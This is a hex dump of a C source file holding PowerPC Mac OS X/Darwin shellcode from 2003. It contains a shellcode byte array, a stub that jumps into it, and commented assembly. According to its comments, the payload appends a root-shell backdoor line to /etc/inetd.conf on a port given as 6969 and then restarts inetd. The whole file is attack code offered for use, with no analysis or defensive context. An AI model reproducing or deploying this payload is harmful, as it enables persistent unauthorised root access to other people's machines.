00000000  2f 2a 0d 0a 50 50 43 20  4f 53 20 58 20 2f 20 44  |/*..PPC OS X / D|
00000010  61 72 77 69 6e 20 53 68  65 6c 6c 63 6f 64 65 20  |arwin Shellcode |
00000020  62 79 20 42 2d 72 30 30  74 2e 20 32 30 30 33 2e  |by B-r00t. 2003.|
00000030  0d 0a 6f 70 65 6e 28 29  3b 20 77 72 69 74 65 28  |..open(); write(|
00000040  29 3b 20 63 6c 6f 73 65  28 29 3b 20 65 78 65 63  |); close(); exec|
00000050  76 65 28 29 3b 20 65 78  69 74 28 29 3b 0d 0a 53  |ve(); exit();..S|
00000060  65 65 20 41 53 4d 20 62  65 6c 6f 77 2e 0d 0a 32  |ee ASM below...2|
00000070  32 32 20 42 79 74 65 73  21 0d 0a 2a 2f 0d 0a 0d  |22 Bytes!..*/...|
00000080  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
00000090  5d 20 3d 0d 0a 22 5c 78  37 63 5c 78 61 35 5c 78  |] =.."\x7c\xa5\x|
000000a0  32 61 5c 78 37 39 5c 78  34 30 5c 78 38 32 5c 78  |2a\x79\x40\x82\x|
000000b0  66 66 5c 78 66 64 5c 78  37 64 5c 78 34 38 5c 78  |ff\xfd\x7d\x48\x|
000000c0  30 32 5c 78 61 36 5c 78  33 62 5c 78 65 61 5c 78  |02\xa6\x3b\xea\x|
000000d0  30 31 5c 78 37 30 22 0d  0a 22 5c 78 33 39 5c 78  |01\x70".."\x39\x|
000000e0  36 30 5c 78 30 31 5c 78  37 30 5c 78 33 39 5c 78  |60\x01\x70\x39\x|
000000f0  31 66 5c 78 66 66 5c 78  31 62 5c 78 37 63 5c 78  |1f\xff\x1b\x7c\x|
00000100  61 38 5c 78 32 39 5c 78  61 65 5c 78 33 39 5c 78  |a8\x29\xae\x39\x|
00000110  31 66 5c 78 66 66 5c 78  36 35 22 0d 0a 22 5c 78  |1f\xff\x65".."\x|
00000120  37 63 5c 78 61 38 5c 78  32 39 5c 78 61 65 5c 78  |7c\xa8\x29\xae\x|
00000130  33 38 5c 78 37 66 5c 78  66 66 5c 78 30 63 5c 78  |38\x7f\xff\x0c\x|
00000140  33 38 5c 78 38 62 5c 78  66 65 5c 78 39 39 5c 78  |38\x8b\xfe\x99\x|
00000150  33 38 5c 78 61 30 5c 78  66 66 5c 78 66 66 22 0d  |38\xa0\xff\xff".|
00000160  0a 22 5c 78 33 38 5c 78  30 62 5c 78 66 65 5c 78  |."\x38\x0b\xfe\x|
00000170  39 35 5c 78 34 34 5c 78  66 66 5c 78 66 66 5c 78  |95\x44\xff\xff\x|
00000180  30 32 5c 78 36 30 5c 78  36 30 5c 78 36 30 5c 78  |02\x60\x60\x60\x|
00000190  36 30 5c 78 33 38 5c 78  39 66 5c 78 66 66 5c 78  |60\x38\x9f\xff\x|
000001a0  31 63 22 0d 0a 22 5c 78  33 38 5c 78 61 62 5c 78  |1c".."\x38\xab\x|
000001b0  66 65 5c 78 63 61 5c 78  33 38 5c 78 30 62 5c 78  |fe\xca\x38\x0b\x|
000001c0  66 65 5c 78 39 34 5c 78  34 34 5c 78 66 66 5c 78  |fe\x94\x44\xff\x|
000001d0  66 66 5c 78 30 32 5c 78  36 30 5c 78 36 30 5c 78  |ff\x02\x60\x60\x|
000001e0  36 30 5c 78 36 30 22 0d  0a 22 5c 78 33 38 5c 78  |60\x60".."\x38\x|
000001f0  30 62 5c 78 66 65 5c 78  39 36 5c 78 34 34 5c 78  |0b\xfe\x96\x44\x|
00000200  66 66 5c 78 66 66 5c 78  30 32 5c 78 36 30 5c 78  |ff\xff\x02\x60\x|
00000210  36 30 5c 78 36 30 5c 78  36 30 5c 78 37 63 5c 78  |60\x60\x60\x7c\x|
00000220  61 35 5c 78 32 61 5c 78  37 39 22 0d 0a 22 5c 78  |a5\x2a\x79".."\x|
00000230  33 38 5c 78 37 66 5c 78  66 66 5c 78 35 36 5c 78  |38\x7f\xff\x56\x|
00000240  39 30 5c 78 36 31 5c 78  66 66 5c 78 66 38 5c 78  |90\x61\xff\xf8\x|
00000250  39 30 5c 78 61 31 5c 78  66 66 5c 78 66 63 5c 78  |90\xa1\xff\xfc\x|
00000260  33 38 5c 78 38 31 5c 78  66 66 5c 78 66 38 22 0d  |38\x81\xff\xf8".|
00000270  0a 22 5c 78 33 38 5c 78  30 62 5c 78 66 65 5c 78  |."\x38\x0b\xfe\x|
00000280  63 62 5c 78 34 34 5c 78  66 66 5c 78 66 66 5c 78  |cb\x44\xff\xff\x|
00000290  30 32 5c 78 36 30 5c 78  36 30 5c 78 36 30 5c 78  |02\x60\x60\x60\x|
000002a0  36 30 5c 78 33 38 5c 78  30 62 5c 78 66 65 5c 78  |60\x38\x0b\xfe\x|
000002b0  39 31 22 0d 0a 22 5c 78  34 34 5c 78 66 66 5c 78  |91".."\x44\xff\x|
000002c0  66 66 5c 78 30 32 5c 78  32 66 5c 78 36 35 5c 78  |ff\x02\x2f\x65\x|
000002d0  37 34 5c 78 36 33 5c 78  32 66 5c 78 36 39 5c 78  |74\x63\x2f\x69\x|
000002e0  36 65 5c 78 36 35 5c 78  37 34 5c 78 36 34 5c 78  |6e\x65\x74\x64\x|
000002f0  32 65 5c 78 36 33 22 0d  0a 22 5c 78 36 66 5c 78  |2e\x63".."\x6f\x|
00000300  36 65 5c 78 36 36 5c 78  35 38 5c 78 30 61 5c 78  |6e\x66\x58\x0a\x|
00000310  36 31 5c 78 36 33 5c 78  36 64 5c 78 37 33 5c 78  |61\x63\x6d\x73\x|
00000320  36 66 5c 78 36 34 5c 78  36 31 5c 78 32 30 5c 78  |6f\x64\x61\x20\x|
00000330  37 33 5c 78 37 34 5c 78  37 32 22 0d 0a 22 5c 78  |73\x74\x72".."\x|
00000340  36 35 5c 78 36 31 5c 78  36 64 5c 78 32 30 5c 78  |65\x61\x6d\x20\x|
00000350  37 34 5c 78 36 33 5c 78  37 30 5c 78 32 30 5c 78  |74\x63\x70\x20\x|
00000360  36 65 5c 78 36 66 5c 78  37 37 5c 78 36 31 5c 78  |6e\x6f\x77\x61\x|
00000370  36 39 5c 78 37 34 5c 78  32 30 5c 78 37 32 22 0d  |69\x74\x20\x72".|
00000380  0a 22 5c 78 36 66 5c 78  36 66 5c 78 37 34 5c 78  |."\x6f\x6f\x74\x|
00000390  32 30 5c 78 32 66 5c 78  37 35 5c 78 37 33 5c 78  |20\x2f\x75\x73\x|
000003a0  37 32 5c 78 32 66 5c 78  36 63 5c 78 36 39 5c 78  |72\x2f\x6c\x69\x|
000003b0  36 32 5c 78 36 35 5c 78  37 38 5c 78 36 35 5c 78  |62\x65\x78\x65\x|
000003c0  36 33 22 0d 0a 22 5c 78  32 66 5c 78 37 34 5c 78  |63".."\x2f\x74\x|
000003d0  36 33 5c 78 37 30 5c 78  36 34 5c 78 32 30 5c 78  |63\x70\x64\x20\x|
000003e0  32 66 5c 78 36 32 5c 78  36 39 5c 78 36 65 5c 78  |2f\x62\x69\x6e\x|
000003f0  32 66 5c 78 37 33 5c 78  36 38 5c 78 30 61 5c 78  |2f\x73\x68\x0a\x|
00000400  32 66 5c 78 37 35 22 0d  0a 22 5c 78 37 33 5c 78  |2f\x75".."\x73\x|
00000410  37 32 5c 78 32 66 5c 78  37 33 5c 78 36 32 5c 78  |72\x2f\x73\x62\x|
00000420  36 39 5c 78 36 65 5c 78  32 66 5c 78 36 39 5c 78  |69\x6e\x2f\x69\x|
00000430  36 65 5c 78 36 35 5c 78  37 34 5c 78 36 34 5c 78  |6e\x65\x74\x64\x|
00000440  35 38 22 3b 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |58";....int main|
00000450  20 28 76 6f 69 64 29 20  0d 0a 7b 0d 0a 20 20 20  | (void) ..{..   |
00000460  20 20 20 20 20 5f 5f 61  73 6d 5f 5f 28 22 62 20  |     __asm__("b |
00000470  5f 73 68 65 6c 6c 63 6f  64 65 22 29 3b 0d 0a 7d  |_shellcode");..}|
00000480  0d 0a 0d 0a 2f 2a 0d 0a  3b 20 50 50 43 20 4f 53  |..../*..; PPC OS|
00000490  20 58 20 2f 20 44 61 72  77 69 6e 20 53 68 65 6c  | X / Darwin Shel|
000004a0  6c 63 6f 64 65 20 62 79  20 42 2d 72 30 30 74 2e  |lcode by B-r00t.|
000004b0  20 0d 0a 3b 20 6f 70 65  6e 28 29 3b 20 77 72 69  | ..; open(); wri|
000004c0  74 65 28 29 3b 20 63 6c  6f 73 65 28 29 3b 20 65  |te(); close(); e|
000004d0  78 65 63 76 65 28 29 3b  20 65 78 69 74 28 29 0d  |xecve(); exit().|
000004e0  0a 3b 20 41 70 70 65 6e  64 73 20 61 20 62 61 63  |.; Appends a bac|
000004f0  6b 64 6f 6f 72 20 28 70  6f 72 74 20 36 39 36 39  |kdoor (port 6969|
00000500  20 72 6f 6f 74 73 68 65  6c 6c 29 20 6c 69 6e 65  | rootshell) line|
00000510  20 69 6e 74 6f 20 0d 0a  3b 20 27 2f 65 74 63 2f  | into ..; '/etc/|
00000520  69 6e 65 74 64 2e 63 6f  6e 66 27 20 61 6e 64 20  |inetd.conf' and |
00000530  65 78 65 63 75 74 65 73  20 27 2f 75 73 72 2f 73  |executes '/usr/s|
00000540  62 69 6e 2f 69 6e 65 74  64 27 2e 0d 0a 3b 20 43  |bin/inetd'...; C|
00000550  6f 6d 6d 61 6e 64 73 20  4d 55 53 54 20 65 6e 64  |ommands MUST end|
00000560  20 77 69 74 68 20 27 3b  27 20 69 65 2e 20 75 6e  | with ';' ie. un|
00000570  61 6d 65 20 2d 61 3b 0d  0a 3b 0d 0a 2e 67 6c 6f  |ame -a;..;...glo|
00000580  62 6c 20 5f 6d 61 69 6e  0d 0a 2e 74 65 78 74 0d  |bl _main...text.|
00000590  0a 5f 6d 61 69 6e 3a 0d  0a 20 20 20 20 20 20 20  |._main:..       |
000005a0  20 78 6f 72 2e 20 20 20  20 72 35 2c 20 72 35 2c  | xor.    r5, r5,|
000005b0  20 72 35 0d 0a 20 20 20  20 20 20 20 20 62 6e 65  | r5..        bne|
000005c0  6c 20 20 20 20 5f 6d 61  69 6e 20 20 20 20 20 20  |l    _main      |
000005d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
000005e0  20 20 20 20 20 20 20 20  6d 66 6c 72 20 20 20 20  |        mflr    |
000005f0  72 31 30 0d 0a 09 61 64  64 69 09 72 33 31 2c 20  |r10...addi.r31, |
00000600  72 31 30 2c 20 33 36 38  0d 0a 09 6c 69 20 20 20  |r10, 368...li   |
00000610  20 20 20 72 31 31 2c 20  33 36 38 0d 0a 20 20 20  |   r11, 368..   |
00000620  20 20 20 20 20 61 64 64  69 20 20 20 20 72 38 2c  |     addi    r8,|
00000630  20 72 33 31 2c 20 2d 32  32 39 20 0d 0a 20 20 20  | r31, -229 ..   |
00000640  20 20 20 20 20 73 74 62  78 20 20 20 20 72 35 2c  |     stbx    r5,|
00000650  20 72 38 2c 20 72 35 0d  0a 20 20 20 20 20 20 20  | r8, r5..       |
00000660  20 61 64 64 69 20 20 20  20 72 38 2c 20 72 33 31  | addi    r8, r31|
00000670  2c 20 2d 31 35 35 20 0d  0a 20 20 20 20 20 20 20  |, -155 ..       |
00000680  20 73 74 62 78 20 20 20  20 72 35 2c 20 72 38 2c  | stbx    r5, r8,|
00000690  20 72 35 0d 0a 20 20 20  20 20 20 20 20 61 64 64  | r5..        add|
000006a0  69 20 20 20 20 72 33 2c  20 72 33 31 2c 20 2d 32  |i    r3, r31, -2|
000006b0  34 34 0d 0a 09 61 64 64  69 20 20 20 20 72 34 2c  |44...addi    r4,|
000006c0  20 72 31 31 2c 20 2d 33  35 39 0d 0a 20 20 20 20  | r11, -359..    |
000006d0  20 20 20 20 6c 69 20 20  20 20 20 20 72 35 2c 20  |    li      r5, |
000006e0  2d 31 20 20 0d 0a 20 20  20 20 20 20 20 20 61 64  |-1  ..        ad|
000006f0  64 69 20 20 20 20 72 30  2c 20 72 31 31 2c 20 2d  |di    r0, r11, -|
00000700  33 36 33 20 0d 0a 20 20  20 20 20 20 20 20 2e 6c  |363 ..        .l|
00000710  6f 6e 67 20 20 20 30 78  34 34 66 66 66 66 30 32  |ong   0x44ffff02|
00000720  0d 0a 20 20 20 20 20 20  20 20 2e 6c 6f 6e 67 20  |..        .long |
00000730  20 20 30 78 36 30 36 30  36 30 36 30 0d 0a 20 20  |  0x60606060..  |
00000740  20 20 20 20 20 20 61 64  64 69 20 20 20 20 72 34  |      addi    r4|
00000750  2c 20 72 33 31 2c 20 2d  32 32 38 20 0d 0a 20 20  |, r31, -228 ..  |
00000760  20 20 20 20 20 20 61 64  64 69 20 20 20 20 72 35  |      addi    r5|
00000770  2c 20 72 31 31 2c 20 2d  33 31 30 0d 0a 20 20 20  |, r11, -310..   |
00000780  20 20 20 20 20 61 64 64  69 20 20 20 20 72 30 2c  |     addi    r0,|
00000790  20 72 31 31 2c 20 2d 33  36 34 0d 0a 20 20 20 20  | r11, -364..    |
000007a0  20 20 20 20 2e 6c 6f 6e  67 20 20 20 30 78 34 34  |    .long   0x44|
000007b0  66 66 66 66 30 32 0d 0a  20 20 20 20 20 20 20 20  |ffff02..        |
000007c0  2e 6c 6f 6e 67 20 20 20  30 78 36 30 36 30 36 30  |.long   0x606060|
000007d0  36 30 0d 0a 20 20 20 20  20 20 20 20 61 64 64 69  |60..        addi|
000007e0  20 20 20 20 72 30 2c 20  72 31 31 2c 20 2d 33 36  |    r0, r11, -36|
000007f0  32 0d 0a 20 20 20 20 20  20 20 20 2e 6c 6f 6e 67  |2..        .long|
00000800  20 20 20 30 78 34 34 66  66 66 66 30 32 20 20 20  |   0x44ffff02   |
00000810  20 20 20 0d 0a 20 20 20  20 20 20 20 20 2e 6c 6f  |   ..        .lo|
00000820  6e 67 20 20 20 30 78 36  30 36 30 36 30 36 30 0d  |ng   0x60606060.|
00000830  0a 20 20 20 20 20 20 20  20 78 6f 72 2e 20 20 20  |.        xor.   |
00000840  20 72 35 2c 20 72 35 2c  20 72 35 0d 0a 20 20 20  | r5, r5, r5..   |
00000850  20 20 20 20 20 61 64 64  69 20 20 20 20 72 33 2c  |     addi    r3,|
00000860  20 72 33 31 2c 20 2d 31  37 30 20 20 20 20 20 20  | r31, -170      |
00000870  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 73 74  |    ..        st|
00000880  77 20 20 20 20 20 72 33  2c 20 2d 38 28 72 31 29  |w     r3, -8(r1)|
00000890  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
000008a0  73 74 77 20 20 20 20 20  72 35 2c 20 2d 34 28 72  |stw     r5, -4(r|
000008b0  31 29 20 20 20 20 20 20  0d 0a 20 20 20 20 20 20  |1)      ..      |
000008c0  20 20 73 75 62 69 20 20  20 20 72 34 2c 20 72 31  |  subi    r4, r1|
000008d0  2c 20 38 20 20 20 20 20  20 20 0d 0a 20 20 20 20  |, 8       ..    |
000008e0  20 20 20 20 61 64 64 69  20 20 20 20 20 72 30 2c  |    addi     r0,|
000008f0  20 72 31 31 2c 20 2d 33  30 39 20 20 20 20 20 20  | r11, -309      |
00000900  20 20 20 20 20 20 20 0d  0a 20 20 20 20 20 20 20  |       ..       |
00000910  20 2e 6c 6f 6e 67 20 20  20 30 78 34 34 66 66 66  | .long   0x44fff|
00000920  66 30 32 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |f02      ..     |
00000930  20 20 20 2e 6c 6f 6e 67  20 20 20 30 78 36 30 36  |   .long   0x606|
00000940  30 36 30 36 30 0d 0a 20  20 20 20 20 20 20 20 61  |06060..        a|
00000950  64 64 69 20 20 20 20 72  30 2c 20 72 31 31 2c 20  |ddi    r0, r11, |
00000960  2d 33 36 37 0d 0a 20 20  20 20 20 20 20 20 2e 6c  |-367..        .l|
00000970  6f 6e 67 20 20 20 30 78  34 34 66 66 66 66 30 32  |ong   0x44ffff02|
00000980  0d 0a 70 61 74 68 3a 20  20 20 2e 61 73 63 69 7a  |..path:   .asciz|
00000990  20 20 22 2f 65 74 63 2f  69 6e 65 74 64 2e 63 6f  |  "/etc/inetd.co|
000009a0  6e 66 58 5c 6e 61 63 6d  73 6f 64 61 20 73 74 72  |nfX\nacmsoda str|
000009b0  65 61 6d 20 74 63 70 20  6e 6f 77 61 69 74 20 72  |eam tcp nowait r|
000009c0  6f 6f 74 20 2f 75 73 72  2f 6c 69 62 65 78 65 63  |oot /usr/libexec|
000009d0  2f 74 63 70 64 20 2f 62  69 6e 2f 73 68 5c 6e 2f  |/tcpd /bin/sh\n/|
000009e0  75 73 72 2f 73 62 69 6e  2f 69 6e 65 74 64 58 22  |usr/sbin/inetdX"|
000009f0  0d 0a 0d 0a 2a 2f                                 |....*/|
000009f6
